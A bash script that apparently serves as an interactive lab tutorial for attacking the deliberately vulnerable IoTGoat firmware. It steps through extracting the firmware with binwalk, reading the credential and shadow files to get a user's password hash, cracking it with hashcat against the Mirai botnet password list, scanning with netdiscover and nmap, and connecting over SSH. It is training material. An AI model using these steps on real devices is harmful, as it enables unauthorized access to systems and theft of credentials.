#! /bin/bash

# Extracting the files system
binwalk_extraction(){
    echo -e "We already have the firmware image, we can extract it using 'binwalk -e {file}'."
    echo -e "After that we will be able to explore the files system of IotGoat.\n"

    echo -e "\n> ls"
    ls --color=auto
    read -p "File to extract: " file

    echo -e "\n> binwalk -e $file"
    binwalk --run-as=root -e $file

    echo -e "\nExtraction done!"
}

# Finding the user and his password hash
user_information(){
    folder="_$1.extracted"
    files_system="$folder/squashfs-root"

    echo -e "\n> ls"
    ls --color=auto

    echo -e "\nThe extracted content can be found inside $folder."

    echo -e "\n> ls $folder"
    ls $folder --color=auto

    echo -e "\n'squashfs-root' is the files system here."

    read -p "Press Enter to proceed:"
    echo -e "\n> ls $files_system"
    ls $files_system --color=auto

    echo -e "\nWhat would be the path from root to the file where we can find a user that can use '/bin/ash' ?"
    read -p "Must start with '/': " path

    echo -e "\n> cat $files_system$path"
    cat $files_system$path

    echo -e "\nHere we are interested in the user that can use '/bin/ash'."
    read -p "What is his name (HINT: not root)? " user

    echo -e "\nWhat would be the path from root to the file where we can find $user password hash ?"
    read -p "Must start with '/': " path

    echo -e "\n> cat $files_system$path | grep $user"
    cat $files_system$path | grep $user

    echo -e "\nRemember the user name, we will need it when we will try to open a ssh connection."
    read -p "What is the hash of his password? " hash
}

# Cracking the user password
hashcat_attack(){
    echo -e "In order to crack the hash with hashcat we will need a passwords list."
    echo -e "Here we will use a list of common IoT passwords that were used during the Mirai Botnet attack (list from Seclists)."

    read -p "Press Enter to see the list:"
    echo -e "\n> head -n 5 mirai-botnet.txt"
    head -n 5 mirai-botnet.txt

    echo -e "\nAs we can see the list has usernames in the first column and passwords in the second."
    echo -e "We need to extract the passwords in a new list."
    echo -e "For this purpose we can use 'awk '{print \$column}' \$file', this will print a column from the specified file."

    read -p "Press Enter to proceed:"
    echo -e "\n> awk '{print \$2}' mirai-botnet.txt > mirai-passwords.txt"
    awk '{print $2}' mirai-botnet.txt > mirai-passwords.txt
    echo -e "> head -n 5 mirai-passwords.txt"
    head -n 5 mirai-passwords.txt
    
    echo -e "\nThe passwords list is built but we also need to put the hash in a file."

    read -p "Press Enter to proceed:"
    echo -e "\n> echo $1 > hash.txt"
    echo $1 > hash.txt
    cat hash.txt

    echo -e "\nNow we can use hashcat."

    read -p "Press Enter to proceed:"
    echo -e "\n> hashcat -a 0 hash.txt mirai-passwords.txt"
    hashcat -a 0 hash.txt mirai-passwords.txt

    echo -e ""

    read -p "What is the password? " password
}

# Look for other machines in the network
network_exploration(){
    echo -e "In order to get information on your IP address and the networks you're in you can use 'ip a'."

    read -p "Press Enter to see the command output:"

    echo -e "\n> ip a"
    ip a


    echo -e "\n'netdiscover -r {network_ip}' allows you to see all the IP addresses in the provided network. ('q' to stop)"

    echo -e ""
    read -p "Address of the network you wish to explore: " network_ip

    echo -e "\n> netdiscover -r $network_ip"
    netdiscover -r $network_ip
}

# Looking for open ports on the host machine
ports_discovery(){
    echo -e "Here we already know that the ssh port of the emulated machine has been forwarded to the port 8022 of the host."
    echo -e "However we could still use 'nmap {machine_ip}' to check for open ports on the host machine."

    echo -e ""
    read -p "Address of the machine you want to check: " machine_ip

    echo -e "\n> nmap $machine_ip"
    nmap $machine_ip
}

# Connecting in ssh
ssh_connection(){
    echo -e "To open a ssh connection you can use the command 'ssh {user}@{machine_ip} -p {port}'."
    echo -e "Here we also have to provide the '-oHostKeyAlgorithms' argument (ssh-rsa in our case)."

    echo -e ""
    read -p "User: " user
    read -p "Address of the machine: " machine_ip
    read -p "Port to use: " port

    echo -e "\n- REMINDER -"
    echo -e "This is the password you found: $1"

    echo -e "\n> ssh $user@$machine_ip -p $port -oHostKeyAlgorithms=+ssh-rsa"
    ssh $user@$machine_ip -p $port -oHostKeyAlgorithms=+ssh-rsa
}


# Main
main(){
    file=""
    hash=""
    password=""

    choice=-1
    while [ $choice -ne 0 ]
    do
        clear
        echo -e "Menu:"
        echo -e "\t1. Binwalk extraction"
        echo -e "\t2. User information"
        echo -e "\t3. Hashcat attack"
        echo -e "\t4. Network exploration"
        echo -e "\t5. Ports discovery"
        echo -e "\t6. ssh connection"
        echo -e "\t0. Exit\n"

        read -p "Choice: " choice
        clear

        case $choice in
            1)
                binwalk_extraction
                ;;

            2)
                user_information $file
                ;;

            3)
                hashcat_attack $hash
                ;;

            4)
                network_exploration
                ;;

            5)
                ports_discovery
                ;;

            6)
                ssh_connection $password
                ;;
            0)
                break
                ;;
        esac

        echo -e "\n"
        read -p "Press ENTER to return to the menu."
    done
}

main
